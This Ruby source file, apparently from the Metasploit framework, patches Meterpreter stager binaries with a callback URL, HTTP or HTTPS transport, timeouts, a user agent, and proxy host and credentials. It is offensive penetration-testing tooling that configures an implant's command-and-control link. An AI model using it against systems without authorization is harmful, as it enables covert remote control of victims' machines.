# -*- coding: binary -*-

module Rex
  module Payloads
    module Meterpreter
      ###
      #
      # Provides methods to patch options into metsrv stagers
      #
      ###
      module Patch

	      # Replace the transport string
	      def self.patch_transport blob, ssl, url, expiration, comm_timeout
	        
          i = blob.index("METERPRETER_TRANSPORT_SSL")
          if i
            str = ssl ? "METERPRETER_TRANSPORT_HTTPS\x00" : "METERPRETER_TRANSPORT_HTTP\x00"
            blob[i, str.length] = str
          end
          
          i = blob.index("https://" + ("X" * 256))
          if i
            str = url
            blob[i, str.length] = str
          end

          i = blob.index([0xb64be661].pack("V"))
          if i
            str = [ expiration ].pack("V")
            blob[i, str.length] = str
          end

          i = blob.index([0xaf79257f].pack("V"))
          if i
            str = [ comm_timeout ].pack("V")
            blob[i, str.length] = str
          end

        return blob
	      end

        # Replace the user agent string with our option
        def self.patch_ua blob, ua

          i = blob.index("METERPRETER_UA\x00")
          if i
            blob[i, ua.length] = ua
          end

          return blob, i
        end

        # Activate a custom proxy
        def self.patch_proxy blob, proxyhost, proxyport, proxy_type

          i = blob.index("METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
          if i
            if proxyhost
              if proxyhost.to_s != ""
                proxyhost = proxyhost.to_s
                proxyport = proxyport.to_s || "8080"
                proxyinfo = proxyhost + ":" + proxyport
                if proxyport == "80"
                  proxyinfo = proxyhost
                end
                if proxy_type.to_s == 'HTTP'
                  proxyinfo = 'http://' + proxyinfo
                else #socks
                  proxyinfo = 'socks=' + proxyinfo
                end
                proxyinfo << "\x00"
                blob[i, proxyinfo.length] = proxyinfo
              end
            end
          end

        return blob, i, proxyinfo
        end

        # Proxy authentification
        def self.patch_proxy_auth blob, proxy_username, proxy_password, proxy_type

          unless (proxy_username.nil? or proxy_username.empty?) or
            (proxy_password.nil? or proxy_password.empty?) or
            proxy_type == 'SOCKS'

            proxy_username_loc = blob.index("METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
            proxy_username = proxy_username << "\x00"
            blob[proxy_username_loc, proxy_username.length] = proxy_username

            proxy_password_loc = blob.index("METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
            proxy_password = proxy_password << "\x00"
            blob[proxy_password_loc, proxy_password.length] = proxy_password
          end

          return blob
        end

      end
    end
  end
end
